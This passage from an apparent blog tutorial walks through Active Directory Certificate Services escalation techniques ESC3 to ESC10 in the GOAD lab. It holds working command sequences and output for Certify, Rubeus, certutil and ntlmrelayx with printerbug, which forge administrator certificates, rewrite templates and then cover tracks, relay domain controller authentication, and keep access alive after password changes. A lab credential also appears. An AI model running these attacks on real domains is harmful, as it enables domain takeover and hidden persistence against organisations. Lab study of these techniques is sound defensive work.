Agent certificate\nThe built-in template is called \"EnrollmentAgent\" - clone it to ESC3-CRA for your lab if needed\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eCertify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:EnrollmentAgent\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\khal.drogo\n[*] Template                : EnrollmentAgent\n[*] Subject                 : CN=khal.drogo, CN=Users, DC=essos, DC=local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 9\n\n[*] cert.pem                :\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAzGQ5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQWxkT8F6PSyEz\n...enrollment agent certificate...\n-----END CERTIFICATE-----\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eStep 2: Use agent certificate to request certificate for Domain Admin\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eCertify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:User /onbehalfof:ESSOS\\administrator /enrollcert:agent.pfx /enrollcertpw:mimikatz\n\n[*] Action: Request a Certificates on behalf of another user\n[*] Current user context    : ESSOS\\khal.drogo\n[*] Template                : User\n[*] On behalf of            : ESSOS\\administrator\n[*] Agent Certificate       : agent.pfx\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 10\n\n[*] cert.pem                :\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA8Fj9BNQ3T4Uy8F0aGF9ZLQWxkT8F6PSyEzGCq5VJXpF8rTQ\n...administrator certificate...\n-----END CERTIFICATE-----\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eStep 3: Authenticate as administrator\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eRubeus.exe asktgt /user:administrator /certificate:admin.pfx\n\n[*] Action: Ask TGT\n[*] Using PKINIT with etype rc4_hmac and subject: CN=administrator, CN=Users, DC=essos, DC=local\n[+] TGT request successful!\n\n  ServiceName              : krbtgt/essos.local\n  ServiceRealm             : ESSOS.LOCAL\n  UserName                 : administrator\n  UserRealm                : ESSOS.LOCAL\n  StartTime                : 1/3/2025 11:15:23 AM\n  EndTime                  : 1/3/2025 9:15:23 PM\n  RenewTill                : 1/10/2025 11:15:23 AM\n  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ePerfect! We've escalated from \u003ccode\u003ekhal.drogo\u003c/code\u003e to \u003ccode\u003eadministrator\u003c/code\u003e using the ESC3 technique.\u003c/p\u003e\n\u003ch2\u003eESC4: Vulnerable Certificate Template Access Control\u003c/h2\u003e\n\u003cp\u003eESC4 is one of my favorite techniques because it's sneaky. Instead of exploiting existing vulnerable templates, you modify a secure template to make it vulnerable, exploit it, then clean up your tracks.\u003c/p\u003e\n\u003ch3\u003eExploitation Strategy\u003c/h3\u003e\n\u003cp\u003eHere's how the attack works:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eFind templates where you have dangerous permissions (WriteProperty or WriteOwner)\u003c/li\u003e\n\u003cli\u003eModify the template to make it vulnerable to ESC1\u003c/li\u003e\n\u003cli\u003eExploit the newly vulnerable template\u003c/li\u003e\n\u003cli\u003eClean up your modifications to cover your tracks\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003ePractical Implementation\u003c/h3\u003e\n\u003cp\u003eLet's see what we can modify in GOAD. Find templates with vulnerable ACLs:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eCertify.exe find /vulnerable\n\n[!] Vulnerable Certificates Templates :\n\n    CA Name                       : braavos.essos.local\\ESSOS-CA\n    Template Name                 : ESC4\n    Schema Version                : 2\n    Validity Period               : 1 year\n    Renewal Period                : 6 weeks\n    msPKI-Certificate-Name-Flag   : 0x0\n    mspki-enrollment-flag         : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS\n    Authorized Signatures Required: 0\n    pkiextendedkeyusage           : Client Authentication\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights           : ESSOS\\Domain Users                    Access: Allow\n      Object Control Permissions\n        Owner                       : ESSOS\\Administrator\n        WriteProperty Principals    : ESSOS\\khal.drogo                     Access: Allow\n        WriteDacl Principals        : ESSOS\\Administrator\n\n# First, backup original template settings for cleanup\nGet-ADObject \"CN=ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\" -Properties * | Select-Object * | Export-Clixml ESC4-backup.xml\n\n# Modify template to enable ENROLLEE_SUPPLIES_SUBJECT\n$template = Get-ADObject \"CN=ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\"\nSet-ADObject $template.DistinguishedName -Replace @{\"msPKI-Certificate-Name-Flag\"=1}\n\n[*] Template ESC4 modified to enable ENROLLEE_SUPPLIES_SUBJECT\n\n# Wait for AD replication\nStart-Sleep -Seconds 30\n\n# Request certificate with arbitrary SAN\nCertify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:ESC4 /altname:upn:administrator@essos.local\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\khal.drogo\n[*] Template                : ESC4\n[*] Subject                 : CN=khal.drogo, CN=Users, DC=essos, DC=local\n[*] AltName                 : administrator@essos.local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 11\n\n# Authenticate as administrator\nRubeus.exe asktgt /user:administrator /certificate:admin.pfx\n\n[+] TGT request successful!\n\n# Restore original template (cleanup)\n$template = Get-ADObject \"CN=ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\"\nSet-ADObject $template.DistinguishedName -Replace @{\"msPKI-Certificate-Name-Flag\"=0}\n\n[*] Template ESC4 restored to original configuration\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003ePowerShell Template Modification\u003c/h3\u003e\n\u003cp\u003eHere's a more robust script for template modification in GOAD:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003efunction Modify-CertificateTemplate {\n    param(\n        [string]$TemplateName,\n        [switch]$EnableSubjectAltName,\n        [switch]$Restore,\n        [string]$Domain = \"essos.local\"\n    )\n    \n    $configPath = \"CN=Configuration,\" + (Get-ADDomain -Identity $Domain).DistinguishedName\n    $templatePath = \"CN=$TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$configPath\"\n    \n    try {\n        $template = Get-ADObject $templatePath -Properties \"msPKI-Certificate-Name-Flag\"\n        \n        if ($Restore) {\n            # Restore to secure setting\n            Set-ADObject $template.DistinguishedName -Replace @{\"msPKI-Certificate-Name-Flag\"=0}\n            Write-Host \"[+] Template $TemplateName restored to secure configuration\"\n        } else {\n            # Enable ENROLLEE_SUPPLIES_SUBJECT\n            Set-ADObject $template.DistinguishedName -Replace @{\"msPKI-Certificate-Name-Flag\"=1}\n            Write-Host \"[+] Template $TemplateName modified to enable subject specification\"\n        }\n        \n        # Wait for AD replication\n        Write-Host \"[*] Waiting for AD replication...\"\n        Start-Sleep -Seconds 30\n        \n    } catch {\n        Write-Error \"Failed to modify template: $($_.Exception.Message)\"\n    }\n}\n\n# Usage in GOAD environment\nModify-CertificateTemplate -TemplateName \"ESC4\" -EnableSubjectAltName -Domain \"essos.local\"\n# ... perform attack ...\nModify-CertificateTemplate -TemplateName \"ESC4\" -Restore -Domain \"essos.local\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eESC5: Vulnerable PKI Object Access Control\u003c/h2\u003e\n\u003cp\u003eESC5 exploits weak permissions on PKI objects themselves, including the CA server and certificate templates container.\u003c/p\u003e\n\u003ch3\u003eAttack Vectors\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eCA Server Object\u003c/strong\u003e: WriteProperty permission allows configuration changes\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCertificate Templates Container\u003c/strong\u003e: GenericWrite allows template creation\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eIndividual CA Objects\u003c/strong\u003e: Various dangerous permissions\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eLet's examine what we have in GOAD. Check CA object permissions in essos.local domain:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eGet-ADObject \"CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\" -Properties nTSecurityDescriptor\n\nDistinguishedName : CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\nName              : ESSOS-CA\nObjectClass       : pKIEnrollmentService\nObjectGUID        : 4f8bd644-2c29-418c-93f1-fe926f91f6b4\n\n# In GOAD, khal.drogo has interesting permissions on the CA\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eCA Configuration Modification\u003c/h3\u003e\n\u003cp\u003eIf you have WriteProperty, modify CA settings. Enable SAN in issued certificates:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003ecertutil -config \"braavos.essos.local\\ESSOS-CA\" -setreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2\n\nCertUtil: -setreg command completed successfully.\nThe command completed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eRestart certificate services to apply changes\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003enet stop certsvc \u0026#x26;\u0026#x26; net start certsvc\n\nThe Certificate Services service is stopping.\nThe Certificate Services service was stopped successfully.\nThe Certificate Services service is starting.\nThe Certificate Services service was started successfully.\n\n# Wait for services to fully restart\nStart-Sleep -Seconds 10\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNow we can request certificate with SAN from any template:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eCertify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:User /altname:upn:administrator@essos.local\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\khal.drogo\n[*] Template                : User\n[*] Subject                 : CN=khal.drogo, CN=Users, DC=essos, DC=local\n[*] AltName                 : administrator@essos.local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 12\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eCertificate Template Creation\u003c/h3\u003e\n\u003cp\u003eIf you have GenericWrite on the Certificate Templates container in GOAD, create a new vulnerable template:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e$templateDN = \"CN=EvilTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\"\n\n# Template with dangerous settings for GOAD environment\nNew-ADObject -Name \"EvilTemplate\" -Type \"pKICertificateTemplate\" -Path \"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\" -OtherAttributes @{\n    'flags' = 131680\n    'msPKI-Certificate-Name-Flag' = 1\n    'msPKI-Enrollment-Flag' = 41\n    'msPKI-Minimal-Key-Size' = 2048\n    'msPKI-Private-Key-Flag' = 16842752\n    'msPKI-Template-Schema-Version' = 2\n    'pKIDefaultKeySpec' = 1\n    'pKIExpirationPeriod' = ([byte[]](0x00,0x40,0x1E,0xA4,0xE8,0x65,0xFA,0xFF))\n    'pKIExtendedKeyUsage' = @('1.3.6.1.5.5.7.3.2')\n    'pKIKeyUsage' = ([byte[]](0x80,0x00))\n    'pKIOverlapPeriod' = ([byte[]](0x00,0x80,0xA6,0x0A,0xFF,0xDE,0xFF,0xFF))\n    'revision' = 100\n}\n\nObjectGUID                : 8f3e2a1b-9c4d-4e5f-a6b7-c8d9e0f1a2b3\nDistinguishedName         : CN=EvilTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\nName                      : EvilTemplate\nObjectClass               : pKICertificateTemplate\n\n# Template created successfully and ready for exploitation\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eESC6: EDITF_ATTRIBUTESUBJECTALTNAME2\u003c/h2\u003e\n\u003cp\u003eESC6 exploits the \u003ccode\u003eEDITF_ATTRIBUTESUBJECTALTNAME2\u003c/code\u003e flag on the CA, which allows SAN specification in any certificate request.\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eFor detailed information on this vulnerability and remediation steps, see Microsoft Learn's \u003ca href=\"https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting\"\u003e\"Edit vulnerable Certificate Authority setting (ESC6)\"\u003c/a\u003e article.\u003c/em\u003e\u003c/p\u003e\n\u003ch3\u003eVulnerability Check\u003c/h3\u003e\n\u003cp\u003eLet's check the GOAD CA configuration. Check if flag is enabled on ESSOS-CA:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003ecertutil -config \"braavos.essos.local\\ESSOS-CA\" -getreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\ESSOS-CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags REG_DWORD = 0x144120 (1327392)\n\nEDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)\nEDITF_ATTRIBUTEENDDATE -- 20000 (131072)\nEDITF_ATTRIBUTECA -- 4000 (16384)\nEDITF_IGNOREREQUESTERGROUP -- 100000 (1048576)\nCertUtil: -getreg command completed successfully.\n\n# Flag 0x40000 (EDITF_ATTRIBUTESUBJECTALTNAME2) is present!\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eExploitation\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eNote:\u003c/strong\u003e Since the Microsoft hardening released in KB5014754 (May 10, 2022), certificates issued via a CA that still has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled must contain the new SID security extension or rely on weak mapping modes; otherwise logon is refused. ESC6 exploitation therefore commonly requires ESC9 or ESC10 conditions as well.\u003c/p\u003e\n\u003cp\u003eFind CAs with EDITF_ATTRIBUTESUBJECTALTNAME2 flag set:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eCertify.exe find /vulnerable\n\n[!] Vulnerable Certificates Templates :\n[!] Certificate Authority has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set!\n\n    Enterprise CA Name            : ESSOS-CA\n    DNS Hostname                  : braavos.essos.local\n    FullName                      : braavos.essos.local\\ESSOS-CA\n    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED\n    Cert SubjectName              : CN=ESSOS-CA, DC=essos, DC=local\n    UserSpecifiedSAN              : Enabled (ESC6)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eRequest certificate with arbitrary SAN using any template:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eCertify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:User /altname:administrator@essos.local\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\missandei\n[*] Template                : User\n[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local\n[*] AltName                 : administrator@essos.local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 13\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eEven though template doesn't allow subject specification,\nESC6 allows it through the CA configuration\u003c/p\u003e\n\u003ch3\u003eEnabling the Flag (if you have CA admin rights). Enable the dangerous flag on GOAD CA:\u003c/h3\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003ecertutil -config \"braavos.essos.local\\ESSOS-CA\" -setreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2\n\nCertUtil: -setreg command completed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eRestart certificate services:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eRestart-Service CertSvc\n\nWARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to stop...\nWARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to start...\n\nStatus   Name               DisplayName\n------   ----               -----------\nRunning  CertSvc            Active Directory Certificate Services\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eESC7: Vulnerable Certificate Authority Access Control\u003c/h2\u003e\n\u003cp\u003eESC7 is all about getting direct access to the CA itself. If you can get ManageCA or ManageCertificates permissions, you basically own the entire certificate infrastructure.\u003c/p\u003e\n\u003cp\u003eLet's see what permissions we have in GOAD. Check if we have ManageCA rights:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eCertify.exe find /vulnerable\n\n[!] Vulnerable Certificates Templates :\n\n    CA Name                       : braavos.essos.local\\ESSOS-CA\n    Permissions\n      Owner                       : BUILTIN\\Administrators        Access: GenericAll\n      Access Rights               : ESSOS\\Domain Admins           Access: GenericAll\n      Access Rights               : ESSOS\\Enterprise Admins       Access: GenericAll\n      Access Rights               : ESSOS\\viserys.targaryen       Access: ManageCA\n      Access Rights               : ESSOS\\viserys.targaryen       Access: ManageCertificates\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ePerfect! \u003ccode\u003eviserys.targaryen\u003c/code\u003e has ManageCA and ManageCertificates rights in GOAD.\u003c/p\u003e\n\u003ch3\u003eManageCA Rights Exploitation\u003c/h3\u003e\n\u003cp\u003eManageCA rights are like having the keys to the kingdom. Here's what you can do:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# If you have ManageCA, you can:\n# 1. Enable EDITF_ATTRIBUTESUBJECTALTNAME2\ncertutil -config \"braavos.essos.local\\ESSOS-CA\" -setreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2\n\nCertUtil: -setreg command completed successfully.\n\n# 2. Certificate manager rights\n# As the Certify output indicated, viserys.targaryen already possesses ManageCA and ManageCertificates rights in our GOAD scenario.\n# An attacker gaining these rights would typically do so by compromising an account that already has them, or by escalating to a level\n# where they can modify the CA's Active Directory object permissions or the CA server's local groups.\n# With ManageCA rights, one can assign officer rights (ManageCertificates) through the Certificate Authority console (certsrv.msc).\n\n# 3. Restart services to apply changes\nRestart-Service CertSvc\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eManageCertificates Rights Exploitation\u003c/h3\u003e\n\u003cp\u003eWith ManageCertificates, approve pending requests. First, submit a request for a privileged user using SubCA template:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003eCertify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:SubCA /altname:administrator@essos.local\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\viserys.targaryen\n[*] Template                : SubCA\n[*] Subject                 : CN=viserys.targaryen, CN=Users, DC=essos, DC=local\n[*] AltName                 : administrator@essos.local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : Taken Under Submission\n[*] Request ID              : 14\n\n# The request is pending, now approve it with ManageCertificates permission\ncertutil -config \"braavos.essos.local\\ESSOS-CA\" -approve 14\n\n# Expected output:\n# Request 14 approved.\n# CertUtil: -approve command completed successfully.\n\n# Retrieve the issued certificate\nCertify.exe request /ca:braavos.essos.local\\ESSOS-CA /retrieve 14\n\n[*] Action: Retrieve Certificates\n[*] Request ID: 14\n[*] Certificate retrieved successfully\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eESC8: NTLM Relay to AD CS HTTP Endpoints\u003c/h2\u003e\n\u003cp\u003eESC8 is where things get really interesting. It combines ADCS with NTLM relay attacks, targeting HTTP-based certificate enrollment endpoints. I love this technique because it leverages two different attack vectors together.\u003c/p\u003e\n\u003ch3\u003ePrerequisites\u003c/h3\u003e\n\u003cp\u003eIn GOAD, we have perfect conditions for ESC8:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eADCS web enrollment \u003cstrong\u003eenabled\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHTTP enrollment endpoint\u003c/strong\u003e accessible at \u003ccode\u003ehttp://braavos.essos.local/certsrv/\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eWe can perform \u003cstrong\u003eNTLM relay\u003c/strong\u003e attacks\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eNTLM relay works against both HTTP and HTTPS enrollment pages; the protocol matters less than whether Extended Protection for Authentication (EPA) or channel binding tokens are required. Enable EPA and require SSL to break the relay attack.\u003c/p\u003e\n\u003ch3\u003eAttack Implementation\u003c/h3\u003e\n\u003cp\u003eLet's test the web enrollment endpoint first:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# Check if ADCS web enrollment is accessible\ncurl -I http://braavos.essos.local/certsrv/certfnsh.asp\n\nHTTP/1.1 401 Unauthorized\nContent-Length: 1293\nContent-Type: text/html\nServer: Microsoft-IIS/10.0\nWWW-Authenticate: Negotiate\nWWW-Authenticate: NTLM\nDate: Thu, 03 Jan 2025 16:45:12 GMT\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ePerfect! It's requesting NTLM authentication. Now let's set up the relay attack:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# Set up NTLM relay to ADCS HTTP endpoint\npython3 ntlmrelayx.py -t http://braavos.essos.local/certsrv/certfnsh.asp -smb2support --adcs-attack --adcs-template \"DomainController\"\n\nImpacket v0.11.0 - Copyright 2023 Fortra\nNote: Output may vary slightly between versions - banners truncated for brevity\n\n[*] Protocol Client DCOM loaded..\n[*] Protocol Client LDAPS loaded..\n[*] Protocol Client LDAP loaded..\n[*] Protocol Client SMB loaded..\n[*] Protocol Client SMTP loaded..\n[*] Protocol Client MSSQL loaded..\n[*] Protocol Client HTTP loaded..\n[*] Protocol Client HTTPS loaded..\n[*] Running in relay mode to single host\n[*] Setting up SMB Server\n[*] Setting up HTTP Server\n[*] Setting up WCF Server\n\n[*] Servers started, waiting for connections\n\n# In another terminal, trigger authentication from target DC\npython3 printerbug.py essos.local/missandei:fr3edom@meereen.essos.local braavos.essos.local\n\n[*] Impacket v0.11.0 - Copyright 2023 Fortra\n[*] Attempting to trigger authentication via rprn RPC at meereen.essos.local\n[*] Bind OK\n[*] Got handle\nDCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Triggered RPC backconnect, this may or may not have worked\n\n# Back in ntlmrelayx window:\n[*] SMBD-Thread-4: Connection from MEEREEN/192.168.56.12 controlled, attacking target http://braavos.essos.local\nHTTP        : success, Cert saved to /tmp/MEEREEN$cert.b64\n[*] ADCS attack completed. Generated certificate for user MEEREEN$\n\n# Certificate successfully obtained!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLet's convert and use the certificate:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# Convert base64 certificate for use\ncat /tmp/MEEREEN$cert.b64 | base64 -d \u003e meereen.pfx\n\n# Ask for a TGT with the machine certificate\ngettgtpkinit.py essos.local/meereen$ -pfx-file meereen.pfx meereen.ccache\n\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Using TGT from cache file meereen.ccache\n[*] Requesting TGT for meereen$@essos.local using Kerberos PKINIT\n[+] TGT request successful!\n[*] Saved TGT to meereen.ccache\n\n# Use machine certificate for further attacks or DCSync\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eESC9: No Security Extension\u003c/h2\u003e\n\u003cp\u003eESC9 is pure gold for persistence. It exploits certificate templates that don't require the szOID_NTDS_CA_SECURITY_EXT security extension in issued certificates. This means your certificates keep working even when passwords change.\u003c/p\u003e\n\u003ch3\u003eVulnerability Details\u003c/h3\u003e\n\u003cp\u003eWhen certificates lack the security extension, they provide persistent authentication that survives password changes. This is what makes them perfect for maintaining long-term access.\u003c/p\u003e\n\u003ch3\u003eKey Point\u003c/h3\u003e\n\u003cp\u003eA certificate issued from a \u003ccode\u003eNO_SECURITY_EXTENSION\u003c/code\u003e template will still map even after the user changes their password, making it perfect for persistence.\u003c/p\u003e\n\u003ch3\u003eExploitation Process\u003c/h3\u003e\n\u003cp\u003eLet's test this in our GOAD environment:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# Find templates without security extension requirement\nCertify.exe find /vulnerable\n\n[!] Vulnerable Certificates Templates :\n\n    CA Name                       : braavos.essos.local\\ESSOS-CA\n    Template Name                 : ESC9\n    Schema Version                : 2\n    Validity Period               : 1 year\n    Renewal Period                : 6 weeks\n    msPKI-Certificate-Name-Flag   : 0x0\n    mspki-enrollment-flag         : NO_SECURITY_EXTENSION, INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS\n    Authorized Signatures Required: 0\n    pkiextendedkeyusage           : Client Authentication\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights           : ESSOS\\Domain Users                    Access: Allow\n\n# Request certificate for current user (missandei)\nCertify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:ESC9\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\missandei\n[*] Template                : ESC9\n[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 15\n\n[*] cert.pem                :\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA2hT8F6PSyEzGCq5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQW\n...certificate without security extension...\n-----END CERTIFICATE-----\n\n# Test authentication with current certificate\n\nRubeus.exe asktgt /user:missandei /certificate:missandei.pfx /password:mimikatz\n\n[*] Action: Ask TGT\n[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local\n[+] TGT request successful!\n\n# Now change the user's password\nnet user missandei \"NewComplexPassword123!\" /domain\n\nThe command completed successfully.\n\n# Certificate still works for authentication even after password change!\n\nRubeus.exe asktgt /user:missandei /certificate:missandei.pfx /password:mimikatz\n\n[*] Action: Ask TGT\n[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local\n[+] TGT request successful!\n\n  UserName                 : missandei\n  UserRealm                : ESSOS.LOCAL\n  ServiceName              : krbtgt/essos.local\n  ServiceRealm             : ESSOS.LOCAL\n  StartTime                : 1/3/2025 5:30:45 PM\n  EndTime                  : 1/4/2025 3:30:45 AM\n  RenewTill                : 1/10/2025 5:30:45 PM\n  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable\n\n# Perfect persistence! The certificate still authenticates despite password change\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eTemplate Analysis\u003c/h3\u003e\n\u003cp\u003eCheck if template requires security extension in GOAD:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e$templateDN = \"CN=ESC9,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\"\n$template = Get-ADObject -Identity $templateDN -Properties msPKI-Enrollment-Flag\n\n# The CT_FLAG_NO_SECURITY_EXTENSION flag value is 0x80000 (524288)\n$NoSecurityExtensionFlag = 0x80000\n\nif ($template.'msPKI-Enrollment-Flag' -band $NoSecurityExtensionFlag) {\n    Write-Host \"Template '$($template.Name)' has the NO_SECURITY_EXTENSION flag set.\"\n} else {\n    Write-Host \"Template '$($template.Name)' does NOT have the NO_SECURITY_EXTENSION flag set.\"\n}\n\n# Output shows template has NO_SECURITY_EXTENSION flag set - perfect for persistence!\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eESC10: Weak Certificate Mappings\u003c/h2\u003e\n\u003cp\u003eESC10 exploits weak certificate-to-account mapping configurations and certificate mapping vulnerabilities.\u003c/p\u003e\n\u003ch3\u003eAttack Vectors\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eESC10A - Write Access on altSecurityIdentities:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAttackers with write permissions on user objects can modify \u003ccode\u003ealtSecurityIdentities\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eThis attribute maps certificates to user accounts\u003c/li\u003e\n\u003cli\u003eMalicious mapping allows certificate-based authentication as other users\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eESC10B - Weak Certificate Mapping Methods:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eExploits weak \u003ccode\u003eCertificateMappingMethods\u003c/code\u003e registry 